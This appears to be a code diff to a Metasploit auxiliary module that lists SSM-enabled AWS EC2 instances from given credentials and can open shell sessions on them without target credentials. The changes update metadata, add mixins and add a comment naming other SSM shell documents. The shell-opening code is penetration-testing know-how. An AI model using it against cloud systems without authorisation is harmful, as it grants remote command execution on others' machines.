@@ -10,11 +10,14 @@ class MetasploitModule < Msf::Auxiliary
   include Rex::Proto::Http::WebSocket::AmazonSsm
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::CommandShell
+  include Msf::Sessions::CreateSessionOptions
+  include Msf::Auxiliary::ReportSummary
+
   def initialize(info = {})
     super(
       update_info(
         info,
-        'Name' => 'Amazon Web Services EC2 instance enumeration',
+        'Name' => 'Amazon Web Services EC2 SSM enumeration',
         'Description' => %q{
           Provided AWS credentials, this module will call the authenticated
           API of Amazon Web Services to list all SSM-enabled EC2 instances
@@ -24,13 +27,14 @@ class MetasploitModule < Msf::Auxiliary
           This module provides not only the API enumeration identifying EC2
           instances accessible via SSM with given credentials, but enables
           session initiation for all identified targets (without requiring
-          target-level credentials) using the CreateSession mixin option.
+          target-level credentials) using the CreateSession datastore option.
           The module also provides an EC2 ID filter and a limiting throttle
           to prevent session stampedes or expensive messes.
         },
         'Author' => [
           'RageLtMan <rageltman[at]sempervictus>'
         ],
+        'References' => [['URL', 'https://www.sempervictus.com/single-post/once-upon-a-cloudy-air-i-crossed-a-gap-which-wasn-t-there']],
         'License' => MSF_LICENSE,
         'DefaultOptions' => { 'CreateSession' => false },
         'Notes' => {
@@ -143,6 +147,7 @@ class MetasploitModule < Msf::Auxiliary
     session_init = client.start_session({
       target: ec2_id,
       document_name: 'SSM-SessionManagerRunShell'
+      # AWS-RunShellScript, AWS-RunPowerShellScript, etc
     })
     ssm_sock = connect_ssm_ws(session_init)
     chan = ssm_sock.to_ssm_channel
